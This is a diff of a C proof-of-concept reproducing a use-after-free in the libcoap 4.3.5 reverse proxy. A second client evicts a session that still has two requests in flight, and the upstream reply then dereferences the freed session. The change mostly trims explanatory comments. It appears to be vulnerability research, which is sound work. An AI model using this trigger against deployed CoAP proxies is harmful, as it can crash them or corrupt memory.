@@ -1,21 +1,4 @@
-/*
- * Bug A: libcoap proxy use-after-free from incomplete association cleanup.
- *
- * When a client session is reaped, the library calls
- * coap_proxy_remove_association() to drop the proxy_req entries that point at
- * it. In v4.3.5 that function removes only the FIRST matching entry and then
- * breaks (coap_proxy.c:329-341). If one client had several requests in flight
- * to the same upstream, the remaining entries still point at the freed session,
- * so the upstream response dereferences a dangling pointer -> use-after-free.
- *
- * Unlike Bug B this needs an event handler registered (so the cleanup actually
- * runs) and two in-flight requests from the same client (so there is a second
- * entry left behind). Reproduces on 4.3.5; fixed on develop, where the
- * rewritten cleanup removes all matching entries.
- *
- * Build: make poc-bug-a      (links the ASan-instrumented 4.3.5 lib)
- * Run:   ./poc-bug-a         (expect an ASan heap-use-after-free report)
- */
+/* Bug A: libcoap proxy UAF — cleanup removes only the first matching proxy_req (4.3.5). */
 #include <coap3/coap.h>
 #include <netinet/in.h>
 #include <stdio.h>
@@ -30,8 +13,7 @@ static coap_proxy_server_list_t reverse_proxy = {
     .entry = &rp_entry,
     .entry_count = 1,
     .type = COAP_PROXY_REVERSE,
-    .track_client_session =
-        0, /* shared proxy_entry keyed by upstream URI -> the bug */
+    .track_client_session = 0,
 };
 
 static void origin_get(coap_resource_t *r COAP_UNUSED,
@@ -57,8 +39,6 @@ static coap_response_t proxy_response(coap_session_t *s,
   return coap_proxy_forward_response(s, recv, NULL);
 }
 
-/* Registering any event handler is what makes the library run its proxy cleanup
- * on SERVER_SESSION_DEL. The body does not matter; it just has to exist. */
 static int proxy_event(coap_session_t *s COAP_UNUSED,
                        coap_event_t ev COAP_UNUSED) {
   return 0;
@@ -121,14 +101,11 @@ int main(void) {
   coap_context_set_max_idle_sessions(proxy, 1);
   coap_add_resource(proxy, coap_resource_reverse_proxy_init(proxy_handler, 0));
   coap_register_response_handler(proxy, proxy_response);
-  coap_register_event_handler(proxy, proxy_event); /* cleanup path is active */
+  coap_register_event_handler(proxy, proxy_event);
 
   coap_context_t *client = coap_new_context(NULL);
 
-  /*
-   * 1. Client S sends TWO GETs to the same upstream. Both are forwarded and
-   *    recorded as two proxy_req entries, both pointing at S. ORIGIN is held.
-   */
+  /* 1. Client S sends two GETs -> two proxy_req entries pointing at S. */
   coap_session_t *S = make_client(client, PROXY_PORT);
   send_get(S, (const uint8_t *)"\x11\x11\x11\x11", 4);
   send_get(S, (const uint8_t *)"\x22\x22\x22\x22", 4);
@@ -137,8 +114,7 @@ int main(void) {
     pump(12, cp);
   }
 
-  /* 2. A second client connects, so S (idle) is evicted and freed. Cleanup runs
-   *    but removes only the first entry; the second still points at freed S. */
+  /* 2. Second client evicts+frees S; cleanup removes only the first entry. */
   coap_session_t *S2 = make_client(client, PROXY_PORT);
   send_get(S2, (const uint8_t *)"\x33\x33\x33\x33", 4);
   {
@@ -146,9 +122,7 @@ int main(void) {
     pump(12, cp);
   }
 
-  /*
-   * 3. ORIGIN answers. Forwarding the surviving response derefs freed S -> UAF.
-   */
+  /* 3. ORIGIN answers -> surviving response derefs freed S -> UAF. */
   {
     coap_context_t *all[] = {origin, proxy, client, NULL};
     pump(40, all);
